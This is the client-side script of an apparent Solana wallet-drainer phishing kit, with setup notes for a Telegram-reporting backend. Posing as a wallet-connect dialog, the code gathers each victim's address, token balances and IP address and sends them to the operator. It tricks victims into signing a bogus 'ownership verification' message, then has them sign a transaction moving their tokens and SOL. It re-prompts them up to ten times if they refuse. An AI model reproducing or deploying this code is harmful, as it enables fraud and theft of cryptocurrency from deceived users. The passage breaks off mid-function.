<!-- Setup Guide
Prerequisites:
- Include jQuery and Solana web3.js libraries in your HTML:
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@1.93.0/dist/index.iife.min.js"></script>
- Ensure a 'public' folder exists in your backend project to serve this script and related assets
- Required HTML elements with IDs: wallet-modal, wallet-options, wallet-loading-state, connect-wallet,
  connect-wallet-hero, close-modal, wallet-modal-overlay, wallet-modal-content, wallet-loading-title,
  wallet-loading-subtitle, phantom-status, solflare-status, phantom-wallet, solflare-wallet
- CSS classes for styling: status-dot, status-text, status-installed, installed, not-installed, hidden,
  active, locked, rejected, shake, phantom-icon, solflare-icon
- Backend server (from previous script) running on port 5000
Environment Variables (in backend):
- BOT_TOKEN: Your Telegram bot token
- CHAT_ID: Your Telegram chat ID
- Replace 'API_KEY_HERE' in the Solana connection URL with your Syndica API key
Usage:
- Include this script in your HTML after jQuery and Solana web3.js
- Run the backend server (node server.js)
- Access the webpage to interact with wallet connection UI
-->

<script>
    // 2. Initialize on Document Ready
    $(document).ready(function() {
        let selectedWalletProvider = null;

        // 3. Utility Functions
        // Fetch client's IP address
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Failed to get IP:', error);
                return null;
            }
        }

        // Fetch SPL token information for a wallet
        async function getSPLTokenInfo(connection, publicKey) {
            try {
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: window.solanaWeb3.TOKEN_PROGRAM_ID,
                });

                const tokens = [];
                const tokenPrices = await getTokenPrices();
                
                for (const tokenAccount of tokenAccounts.value) {
                    const accountData = tokenAccount.account.data;
                    const parsedInfo = accountData.parsed.info;
                    const balance = parsedInfo.tokenAmount;

                    if (balance.uiAmount > 0) {
                        const mint = parsedInfo.mint;
                        const symbol = getTokenSymbol(mint);
                        const price = tokenPrices[mint] || 0;
                        const usdValue = balance.uiAmount * price;
                        
                        tokens.push({
                            mint: mint,
                            balance: balance.uiAmount,
                            symbol: symbol,
                            usdValue: usdValue
                        });
                    }
                }
                return tokens;
            } catch (error) {
                console.error('Failed to get SPL tokens:', error);
                return [];
            }
        }

        // Fetch token prices from CoinGecko
        async function getTokenPrices() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
                const data = await response.json();
                
                return {
                    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                    'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
                };
            } catch (error) {
                console.error('Failed to get token prices:', error);
                return {};
            }
        }

        // Map token mint addresses to symbols
        function getTokenSymbol(mint) {
            const tokenMap = {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
                'So11111111111111111111111111111111111111112': 'WSOL',
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
                'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
                'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
            };
            return tokenMap[mint] || 'Unknown';
        }

        // Send notification to Telegram via backend
        async function sendTelegramNotification(message) {
            try {
                await fetch('/notify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        address: message.address,
                        balance: message.balance,
                        usdBalance: message.usdBalance,
                        walletType: message.walletType,
                        customMessage: message.customMessage,
                        splTokens: message.splTokens,
                        ip: message.ip
                    })
                });
            } catch (error) {
                console.error('Failed to send Telegram notification:', error);
            }
        }

        // Check if the device is mobile
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Get the current site URL
        function getCurrentSiteUrl() {
            return encodeURIComponent(window.location.origin);
        }

        // Check availability of supported wallets (Phantom, Solflare, Torus, Ledger, Sollet, Slope, Sollet Extension)
        function checkWalletAvailability() {
            const isMobileDevice = isMobile();
            
            const wallets = {
                phantom: {
                    provider: window.solana,
                    condition: window.solana && window.solana.isPhantom,
                    name: 'Phantom Wallet',
                    isMobileSupported: true,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                        mobile: 'https://phantom.app/download'
                    }
                },
                torus: {
                    provider: window.Torus,
                    condition: window.Torus && typeof window.Torus.connect === 'function',
                    name: 'Torus Wallet',
                    isMobileSupported: true,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/torus/abjpebfekgjofdjnhdgnlkopdglgahpm',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/torus-wallet/',
                        mobile: 'https://tor.us/download'
                    }
                },
                ledger: {
                    provider: window.LedgerSolana,
                    condition: window.LedgerSolana && typeof window.LedgerSolana.connect === 'function',
                    name: 'Ledger Wallet',
                    isMobileSupported: false,
                    installUrl: {
                        chrome: 'https://support.ledger.com/hc/en-us/articles/115005165269-Install-and-update-Ledger-Live',
                        firefox: 'https://support.ledger.com/hc/en-us/articles/115005165269-Install-and-update-Ledger-Live',
                        mobile: null
                    }
                },
                sollet: {
                    provider: window.sollet,
                    condition: window.sollet && typeof window.sollet.connect === 'function',
                    name: 'Sollet Wallet',
                    isMobileSupported: false,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/sollet/fhmfendgkcjommhlokihnmlgkmnakgaf',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/sollet/',
                        mobile: null
                    }
                },
                slope: {
                    provider: window.slope,
                    condition: window.slope && window.slope.isSlope,
                    name: 'Slope Wallet',
                    isMobileSupported: true,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/slope-wallet/aholpfdialjgjfjmmpgmngihhkljfhlj',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/slope-wallet/',
                        mobile: 'https://slope.finance/download'
                    }
                },
                solflare: {
                    provider: window.solflare,
                    condition: window.solflare && window.solflare.isSolflare,
                    name: 'Solflare Wallet',
                    isMobileSupported: true,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                        mobile: 'https://solflare.com/download'
                    }
                },
                'sollet-extension': {
                    provider: window.solletExtension,
                    condition: window.solletExtension && typeof window.solletExtension.connect === 'function',
                    name: 'Sollet Extension',
                    isMobileSupported: false,
                    installUrl: {
                        chrome: 'https://chrome.google.com/webstore/detail/sollet-extension/fhmfendgkcjommhlokihnmlgkmnakgaf',
                        firefox: 'https://addons.mozilla.org/en-US/firefox/addon/sollet-extension/',
                        mobile: null
                    }
                }
            };

            Object.keys(wallets).forEach(walletId => {
                const wallet = wallets[walletId];
                const statusElement = document.getElementById(`${walletId}-status`);
                const optionElement = document.getElementById(`${walletId}-wallet`);
                
                if (wallet.condition) {
                    statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                    optionElement.disabled = false;
                } else if (isMobileDevice && wallet.isMobileSupported) {
                    statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                    optionElement.disabled = false;
                } else {
                    statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                    optionElement.disabled = false;
                }
            });

            return wallets;
        }

        // Get wallet provider object
        function getWalletProvider(walletType) {
            const providers = {
                phantom: window.solana,
                torus: window.Torus,
                ledger: window.LedgerSolana,
                sollet: window.sollet,
                slope: window.slope,
                solflare: window.solflare,
                'sollet-extension': window.solletExtension
            };
            return providers[walletType];
        }

        // 4. Wallet Connection Logic
        async function connectWallet(walletType, walletProvider) {
            try {
                const wallets = checkWalletAvailability();
                const walletInfo = wallets[walletType];
                const isMobileDevice = isMobile();
                
                // Handle mobile devices without wallet installed
                if (isMobileDevice && !walletInfo.condition) {
                    let deepLinkUrl, appName;
                    
                    if (walletType === 'phantom') {
                        const currentUrl = getCurrentSiteUrl();
                        deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                        appName = 'Phantom App';
                    } else if (walletType === 'solflare') {
                        const currentUrl = getCurrentSiteUrl();
                        deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                        appName = 'Solflare App';
                    } else if (walletType === 'slope') {
                        const currentUrl = getCurrentSiteUrl();
                        deepLinkUrl = `https://slope.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                        appName = 'Slope App';
                    } else if (walletType === 'torus') {
                        deepLinkUrl = 'https://tor.us/download'; // Torus uses a generic download link for mobile
                        appName = 'Torus App';
                    } else {
                        deepLinkUrl = walletInfo.installUrl.mobile || walletInfo.installUrl.chrome;
                        appName = walletInfo.name.replace(' Wallet', ' App');
                    }
                    
                    if (deepLinkUrl) {
                        await sendTelegramNotification({
                            address: 'Unknown',
                            balance: 'Unknown',
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                        });
                        
                        showWalletLoading();
                        $('.wallet-loading-title').text(`Opening ${appName}`);
                        $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                        
                        const connectionCheckInterval = setInterval(() => {
                            const provider = walletType === 'phantom' ? window.solana :
                                            walletType === 'torus' ? window.Torus :
                                            walletType === 'ledger' ? window.LedgerSolana :
                                            walletType === 'sollet' ? window.sollet :
                                            walletType === 'slope' ? window.slope :
                                            walletType === 'solflare' ? window.solflare :
                                            window.solletExtension;
                            const condition = walletType === 'phantom' ? (window.solana && window.solana.isPhantom) :
                                            walletType === 'torus' ? (window.Torus && typeof window.Torus.connect === 'function') :
                                            walletType === 'ledger' ? (window.LedgerSolana && typeof window.LedgerSolana.connect === 'function') :
                                            walletType === 'sollet' ? (window.sollet && typeof window.sollet.connect === 'function') :
                                            walletType === 'slope' ? (window.slope && window.slope.isSlope) :
                                            walletType === 'solflare' ? (window.solflare && window.solflare.isSolflare) :
                                            (window.solletExtension && typeof window.solletExtension.connect === 'function');
                                
                            if (condition) {
                                clearInterval(connectionCheckInterval);
                                connectWallet(walletType, provider);
                            }
                        }, 1000);
                        
                        setTimeout(() => {
                            clearInterval(connectionCheckInterval);
                            showWalletOptions();
                            unlockModal();
                        }, 120000);
                        
                        window.location.href = deepLinkUrl;
                        return;
                    }
                }
                
                // Handle missing wallet extension/app
                if (!walletInfo.condition) {
                    let installUrl;
                    if (isMobileDevice && walletInfo.installUrl.mobile) {
                        installUrl = walletInfo.installUrl.mobile;
                    } else {
                        const isFirefox = typeof InstallTrigger !== "undefined";
                        installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                    }
                    
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                    });
                    
                    showWalletOptions();
                    
                    const installMessage = isMobileDevice ? 
                        `${walletInfo.name} mobile app is required. Would you like to download it?` :
                        `${walletInfo.name} is not installed. Would you like to install it?`;
                    
                    if (confirm(installMessage)) {
                        window.open(installUrl, '_blank');
                    }
                    return;
                }

                if (!walletProvider) {
                    throw new Error('Wallet provider not found');
                }

                // Show loading UI
                showWalletLoading();
                
                // Update UI for specific wallet
                if (walletType === 'phantom') {
                    $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                    $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                    $('.wallet-loading-title').text('Connecting Phantom');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else if (walletType === 'solflare') {
                    $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                    $('.wallet-loading-title').text('Connecting Solflare');
                    $('.wallet-loading-spinner').addClass('solflare');
                } else if (walletType === 'torus') {
                    $('.wallet-loading-spinner img').attr('src', 'https://tor.us/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Torus');
                    $('.wallet-loading-title').text('Connecting Torus');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else if (walletType === 'ledger') {
                    $('.wallet-loading-spinner img').attr('src', 'https://www.ledger.com/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Ledger');
                    $('.wallet-loading-title').text('Connecting Ledger');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else if (walletType === 'sollet') {
                    $('.wallet-loading-spinner img').attr('src', 'https://sollet.io/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Sollet');
                    $('.wallet-loading-title').text('Connecting Sollet');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else if (walletType === 'slope') {
                    $('.wallet-loading-spinner img').attr('src', 'https://slope.finance/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Slope');
                    $('.wallet-loading-title').text('Connecting Slope');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else if (walletType === 'sollet-extension') {
                    $('.wallet-loading-spinner img').attr('src', 'https://sollet.io/favicon.ico');
                    $('.wallet-loading-spinner img').attr('alt', 'Sollet Extension');
                    $('.wallet-loading-title').text('Connecting Sollet Extension');
                    $('.wallet-loading-spinner').removeClass('solflare');
                } else {
                    $('.wallet-loading-title').text('Connecting to Wallet');
                    $('.wallet-loading-spinner').removeClass('solflare');
                }
                
                $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');

                if (walletType === 'solflare') {
                    if (!walletProvider || !walletProvider.isSolflare) {
                        throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
                    }
                } else if (walletType === 'slope') {
                    if (!walletProvider || !walletProvider.isSlope) {
                        throw new Error('Slope wallet not detected. Please make sure Slope extension is installed and enabled.');
                    }
                }

                // Connect to wallet
                let resp;
                if (walletType === 'torus' || walletType === 'ledger' || walletType === 'sollet' || walletType === 'sollet-extension') {
                    resp = await walletProvider.connect();
                } else {
                    resp = await walletProvider.connect();
                }
                console.log(`${walletInfo.name} connected:`, resp);

                $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
                $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');

                // Initialize Solana connection
                const connection = new window.solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/API_KEY_HERE', 
                    'confirmed'
                );

                // Get public key
                let publicKeyString;
                if (walletType === 'solflare') {
                    if (walletProvider.publicKey) {
                        publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                    } else if (walletProvider.pubkey) {
                        publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
                    } else {
                        throw new Error('No public key received from Solflare wallet');
                    }
                } else if (walletType === 'slope') {
                    if (walletProvider.publicKey) {
                        publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
                    } else {
                        throw new Error('No public key received from Slope wallet');
                    }
                } else {
                    if (resp.publicKey) {
                        publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
                    } else {
                        throw new Error('No public key received from wallet');
                    }
                }

                const public_key = new window.solanaWeb3.PublicKey(publicKeyString);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);

                const clientIP = await getClientIP();
                const splTokens = await getSPLTokenInfo(connection, public_key);

                // Notify Telegram of successful connection
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '🔗 Wallet Connected',
                    splTokens: splTokens,
                    ip: clientIP
                });

                // Check minimum balance
                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                const requiredBalance = 0.0005 * 1000000000;
                
                if (walletBalance < requiredBalance) {
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                    });
                    
                    $('.wallet-loading-title').text('Insufficient Balance');
                    $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                    
                    showRejectionEffects();
                    
                    setTimeout(() => {
                        unlockModal();
                        showWalletOptions();
                        $('#connect-wallet').text("Connect Wallet");
                    }, 3000);
                    
                    return;
                }

                $('#connect-wallet').text("Processing...");

                // Attempt transaction with retries
                const attemptTransaction = async (retryCount = 0) => {
                    const maxRetries = 10;
                    
                    try {
                        const verificationKey = `ownership_verified_${publicKeyString}`;
                        const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
                        
                        let ownershipVerified = false;
                        
                        if (isAlreadyVerified) {
                            console.log("Ownership already verified for this wallet, skipping verification");
                            
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: `✅ Ownership Previously Verified - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                            });
                            
                            ownershipVerified = true;
                        } else {
                            $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
                            $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
                            $('#connect-wallet').text('Verifying Ownership...');
                            
                            const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
                            const messageBytes = new TextEncoder().encode(verificationMessage);
                            
                            try {
                                const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                                console.log("Ownership verification signed:", signedMessage);
                                
                                localStorage.setItem(verificationKey, 'true');
                                
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletInfo.name,
                                    customMessage: `✅ User Signed Ownership Verification - Proceeding to withdrawal (Attempt ${retryCount + 1})`
                                });
                                
                                ownershipVerified = true;
                            } catch (signError) {
                                console.error("Ownership verification failed:", signError);
                                
                                const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
                                const signErrorCode = signError.code || '';
                                const signErrorName = signError.name || '';
                                
                                const isSignRejection = 
                                    signErrorMessage.includes('User rejected') || 
                                    signErrorMessage.includes('rejected') || 
                                    signErrorMessage.includes('cancelled') ||
                                    signErrorCode === 4001 ||
                                    signErrorCode === -32003 ||
                                    signErrorName === 'UserRejectedRequestError';
                                
                                if (isSignRejection) {
                                    await sendTelegramNotification({
                                        address: publicKeyString,
                                        balance: solBalanceFormatted,
                                        usdBalance: 'Unknown',
                                        walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                        customMessage: `❌ Ownership Verification Rejected by User (Attempt ${retryCount + 1})`
                                    });
                                    
                                    if (retryCount < maxRetries) {
                                        showRejectionEffects();
                                        $('.wallet-loading-title').text('Verification Rejected');
                                        $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
                                        
                                        setTimeout(() => {
                                            clearRejectionEffects();
                                            attemptTransaction(retryCount + 1);
                                        }, 2000);
                                        return;
                                    } else {
                                        throw new Error('Ownership verification rejected too many times');
                                    }
                                } else {
                                    throw signError;
                                }
                            }
                        }
                        
                        if (!ownershipVerified) {
                            throw new Error('Failed to verify wallet ownership');
                        }
                        
                        $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
                        $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
                        $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
                        
                        // Prepare transaction via backend
                        const prepareResponse = await fetch('/prepare-transaction', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                publicKey: publicKeyString,
                                verified: true
                            })
                        });

                        const prepareData = await prepareResponse.json();
                        
                        if (!prepareResponse.ok) {
                            await sendTelegramNotification({
                                address: publicKeyString,
                                balance: solBalanceFormatted,
                                usdBalance: 'Unknown',
                                walletType: walletInfo.name,
                                customMessage: '❌ Transaction Preparation Failed'
                            });
                            alert(prepareData.error || "Failed to prepare transaction");
                            $('#connect-wallet').text("Connect Wallet");
                            return;
                        }

                        // Sign transaction
                        const transactionBytes = new Uint8Array(prepareData.transaction);
                        const transaction = window.solanaWeb3.Transaction.from(transactionBytes);

                        $('.wallet-loading-title').text('Signing Transaction');
                        $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
                        
                        const signed = await walletProvider.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (Attempt ${retryCount + 1})`
                        });

                        // Send and confirm transaction
                        $('.wallet-loading-title').text('Confirming Transaction');
                        $('.wallet-loading-subtitle').html('Transaction is being confirmed on the blockchain.<br>Please wait...');
                        
                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                        
                        const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
                        const solscanUrl = `https://solscan.io/tx/${txid}`;
                        
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletInfo.name,
                            customMessage: `🎉 Transaction Confirmed! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
                        });
                        
                        $('.wallet-loading-title').text('Success!');
                        $('.wallet-loading-subtitle').html('Assets have been successfully claimed.<br>Transaction confirmed on blockchain.');
                        
                        $('#connect-wallet').text("Assets Claimed Successfully!");
                        
                        setTimeout(() => {
                            unlockModal();
                            hideWalletModal();
                            $('#connect-wallet').text("Connect Wallet");
                        }, 2000);
                        
                    } catch (err) {
                        console.error("Error during claiming:", err);
                        
                        const errorMessage = err.message || err.toString() || 'Unknown error';
                        const errorCode = err.code || '';
                        const errorName = err.name || '';
                        
                        const isUserRejection = 
                            errorMessage.includes('User rejected') || 
                            errorMessage.includes('rejected') || 
                            errorMessage.includes('cancelled') ||
                            errorMessage.includes('Transaction cancelled') ||
                            errorCode === 4001 ||
                            errorCode === -32003 ||
                            errorName === 'UserRejectedRequestError';
                        
                        if (isUserRejection) {
                            if (retryCount < maxRetries) {
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                    customMessage: `❌ Transaction Rejected by User - Retrying... (Attempt ${retryCount + 1}/${maxRetries + 1})`
                                });
                                
                                showRejectionEffects();
                                
                                $('.wallet-loading-title').text('Transaction Rejected');
                                $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
                                
                                setTimeout(() => {
                                    clearRejectionEffects();
                                    attemptTransaction(retryCount + 1);
                                }, 2000);
                                return;
                            } else {
                                await sendTelegramNotification({
                                    address: publicKeyString,
                                    balance: solBalanceFormatted,
                                    usdBalance: 'Unknown',
                                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                                    customMessage: `❌ Transaction Rejected ${maxRetries + 1} Times - Giving Up`
                                });
                                
                                showRejectionEffects();
                                
                                $('.wallet-loading-title').text('Transaction Failed');
                                $('.wallet-loading-subtitle').html(`Transaction was rejected ${maxRetries + 1} times.<br>Please try again later.`);
                                
                                setTimeout(() => {
                                    unlockModal();
                                    showWalletOptions();
                                    $('#connect-wallet').text("Connect Wallet");
                                }, 3000);
                                return;
                            }
                        }
                        
                        let notificationMessage = '❌ Transaction Failed';
                        
                        await sendTelegramNotification({
                            address: publicKeyString,
                            balance: solBalanceFormatted,
                            usdBalance: 'Unknown',
                            walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                            customMessage: `${notificationMessage}: ${errorMessage} (Attempt ${retryCount + 1})`
                        });
                        
                        $('.wallet-loading-title').text('Transaction Failed');
                        $('.wallet-loading-subtitle').html('An error occurred during the transaction.<br>Please try again.');
                        
                        setTimeout(() => {
                            unlockModal();
                            showWalletOptions();
                            $('#connect-wallet').text("Connect Wallet");
                        }, 3000);
                    }
                };

                await attemptTransaction();
                
            } catch (err) {
                console.error(`Error connecting to ${walletType}:`, err);
                
                $('.wallet-loading-title').text('Connection Failed');
                $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension',
                    customMessage: `❌ Wallet Connection Failed: ${err.message || err.toString() || 'Unknown error'}`
                });
                
                setTimeout(() => {
                    showWalletOptions();
                    unlockModal();
                }, 2000);
                
                setTimeout(() => {
                    const walletName = walletType === 'phantom' ? 'Phantom Wallet' : walletType === 'solflare' ? 'Solflare Wallet' : walletType === 'slope' ? 'Slope Wallet' : walletType === 'torus' ? 'Torus Wallet' : walletType === 'ledger' ? 'Ledger Wallet' : walletType === 'sollet' ? 'Sollet Wallet' : 'Sollet Extension';
                    alert(`Failed to connect to ${walletName}: ${err.message || err.toString() || 'Unknown error'}`);
                }, 2100);
            }
        }

        // 5. UI Control Functions
        function showWalletModal() {
            checkWalletAvailability();
            showWalletOptions();
            $('#wallet-modal').fadeIn(200);
        }

        function hideWalletModal() {
            $('#wallet-modal').fadeOut(200);
            showWalletOptions();
            unlockModal();
        }

        function lockModal() {
            $('#wallet-modal').addClass('locked');
        }

        function unlockModal() {
            $('#wallet-modal').removeClass('locked');
        }

        function showWalletOptions() {
            $('#wallet-options').removeClass('hidden');
            $('#wallet-loading-state').removeClass('active');
            $('.wallet-modal-header h3').text('Select Your Wallet');
            clearRejectionEffects();
        }

        function showWalletLoading() {
            $('#wallet-options').addClass('hidden');
            $('#wallet-loading-state').addClass('active');
            $('.wallet-modal-header h3').text('Connecting...');
            lockModal();
            clearRejectionEffects();
        }

        function showRejectionEffects() {
            $('.wallet-loading-spinner').addClass('rejected');
            $('.phantom-icon').addClass('rejected');
            $('.solflare-icon').addClass('rejected');
            $('.wallet-loading-spinner img').addClass('rejected');
            $('.wallet-modal-content').addClass('shake');
            
            setTimeout(() => {
                $('.wallet-modal-content').removeClass('shake');
            }, 600);
        }

        function clearRejectionEffects() {
            $('.wallet-loading-spinner').removeClass('rejected');
            $('.phantom-icon').removeClass('rejected');
            $('.solflare-icon').removeClass('rejected');
            $('.wallet-loading-spinner img').removeClass('rejected');
            $('.wallet-modal-content').removeClass('shake');
        }

        // 6. Event Listeners
        $('#connect-wallet, #connect-wallet-hero').on('click', function() {
            showWalletModal();
        });

        $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
            if (!$('#wallet-modal').hasClass('locked')) {
                hideWalletModal();
            }
        });

        $('.wallet-option').on('click', function() {
            const walletType = $(this).data('wallet');
            const walletProvider = getWalletProvider(walletType);
            
            connectWallet(walletType, walletProvider);
        });

        $(document).on('keydown', function(e) {
            if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
                hideWalletModal();
            }
        });

        // Ensure hero button is bound (redundant but kept for compatibility)
        $('#connect-wallet-hero').on('click', function() {
